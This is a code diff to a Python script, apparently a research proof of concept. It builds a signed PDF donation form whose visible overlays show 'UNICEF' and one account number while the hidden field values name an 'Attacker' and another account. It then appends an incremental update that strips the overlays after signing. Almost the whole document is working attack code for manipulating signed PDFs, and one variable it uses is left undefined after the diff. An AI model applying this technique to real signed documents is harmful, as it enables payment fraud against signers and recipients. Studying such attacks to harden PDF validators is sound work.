@@ -2,6 +2,11 @@
 filename_unsigned       = "pdf/attack/form/form.pdf"
 filename_signed         = filename_unsigned.replace(".pdf", "-signed.pdf")
 filename_manipulated   = filename_signed.replace(".pdf", "-manipulated.pdf")
+
+show_name="UNICEF"
+show_account="123456789"
+attacker_name = "Attacker"
+attacker_account = "666666666"
 # %%
 from reportlab.pdfgen import canvas
 from reportlab.pdfbase import pdfform
@@ -211,9 +216,9 @@ c.drawString(50, 550, 'Amount:')
 form.textfield(name='amount', y=545, value="10 USD", tooltip='Amount', overlay="10 USD",)
 c.drawCentredString(300,500, "Donation Recipient")
 c.drawString(50, 450, 'Recipient Name:')
-form.textfield(name='recipientname', y=445, value="Attacker", tooltip='Recipient Name', overlay="UNICEF", fieldFlags=0)
+form.textfield(name='recipientname', y=445, value=attacker_name, tooltip='Recipient Name', overlay=show_name, fieldFlags=0)
 c.drawString(50, 400, 'Sender Bank Account:')
-form.textfield(name='recipientaccount', y=395, value="666666666", tooltip='Sender Bank Account', overlay="123456789", fieldFlags=0)
+form.textfield(name='recipientaccount', y=395, value=attacker_account, tooltip='Sender Bank Account', overlay=show_account, fieldFlags=0)
 
 
 c.save()
@@ -256,66 +261,62 @@ with open(filename_signed, "wb") as fp:
 # %%
 from pdfmanipulation import *
 
-filename_signed = "pdf/attack/form/form-signed-updated.pdf"
-data_manipulated = bytearray(open(filename_signed, "rb").read())
-updateXref(pdfbytes=data_manipulated, updatexreftable=[2])
-#print(data_signed)
+data_signed = bytearray(open(filename_signed, "rb").read())
+# Detect form fields with overlays
+overlays = getObjectByNeedle(data_signed,f"(?P<overlay>/AP\s+?<<.*?>>).*({attacker_name}|{attacker_account})")
+
+updated_forms = list()
+for match in overlays:
+    # We copy the form field but remove the overlay
+    object_start = match.start()
+    overlay_start = match.start("overlay")
+    overlay_end = match.end("overlay")
+    object_end = match.end()
+    form_without_overlay = data_signed[object_start:overlay_start] + data_signed[overlay_end:object_end]
+    updated_forms.append(form_without_overlay)
+
+offset = len(data_signed)+1
+offsets = list()
+body_update = b""
+for updated_form in updated_forms:
+    offset += len(body_update)
+    offsets.append(offset)
+    body_update += b"\n" + updated_form
+
+
+xref_update = b"""
+xref
+0 1 
+0000000000 65535 f 
+"""
+
+for (match,offset) in zip(overlays,offsets):
+    objnr = match.group("objnr")
+    gennr = int(match.group("gennr").decode())
+    xref_update += objnr + b" 1 \n"
+    xref_update += f"{offset:010} {gennr:05} n \n".encode()
+
+previous_trailer = getTrailer(data_signed)[-1]
+previous_startxref = getStartxref(data_signed)[-1].group("value").decode()
+
+trailer_update = f"""
+trailer
+<<
+/Size {previous_trailer.group("size").decode()}
+/Root {previous_trailer.group("root").decode()}
+/Info {previous_trailer.group("info").decode()}
+/ID {previous_trailer.group("id").decode()}
+/Prev {previous_startxref}
+>>
+startxref
+{len(data_manipulated)+len(body_update)+1}
+%%EOF
+""".encode()
+
 with open(filename_manipulated, "wb") as fp:
-    fp.write(data_manipulated)
-
-
+    fp.write(data_signed)
+    fp.write(body_update)
+    fp.write(xref_update)
+    fp.write(trailer_update)
 # %%
-filename_signed = "pdf/attack/form/form-signed-updated.pdf"
-data_manipulated = open(filename_signed, "rb").read()
-xref = getXref(data_manipulated)
-print(f"Matches: {len(xref)}")
-for i in range(len(xref)):
-    print(f"Match {i}: {xref[i].start()} - {xref[i].end()}\n{xref[i].group().decode()}")
 
-
-# %%
-filename_signed = "pdf/attack/form/form-signed-updated.pdf"
-data_manipulated = open(filename_signed, "rb").read()
-trailer = getTrailer(data_manipulated)
-print(f"Matches: {len(trailer)}")
-for i in range(len(trailer)):
-    m = trailer[i]
-    print(f"Match {i}: {m.start()} - {m.end()}")
-    print(f"\n{m.group().decode()}")
-
-
-# %%
-from pdfmanipulation import getStartxref
-filename_signed = "pdf/attack/form/form-signed-updated.pdf"
-data_manipulated = open(filename_signed, "rb").read()
-startxref = getStartxref(data_manipulated)
-print(f"Matches: {len(startxref)}")
-for i in range(len(startxref)):
-    m = startxref[i]
-    print(f"Match {i}: {m.start()} - {m.end()}")
-    print(f"\n{m.group().decode()}")
-
-# %%
-b = "Hallo meine welt!".encode()
-b = b.replace("meine".encode(),"schöne".encode())
-print(b)
-
-# %%
-from pdfmanipulation import *
-
-data_manipulated = bytearray(open(filename_signed, "rb").read())
-# overlays = getObjectByNeedle(data_manipulated,"/V \(Attacker\)")
-overlays = getObjectByNeedle(data_manipulated,"(?P<overlay>/AP\s+?<<.*?>>).*Attacker")
-i = 0
-for m in overlays:
-    len = m.end()-m.start()
-    print(f"\n### Match {i}: {m.group('objnr').decode()} {m.group('gennr').decode()} obj")
-    print(f"### Offset: {m.start()} - {m.end()} = {len} Bytes:")
-    #print(f"### Needle: {m.group('needle').decode()}")
-    print(f"{m.group()[:m.start('overlay')]}{m.group()[:m.end('overlay')]}")
-    
-    i += 1
-
-
-
-# %%
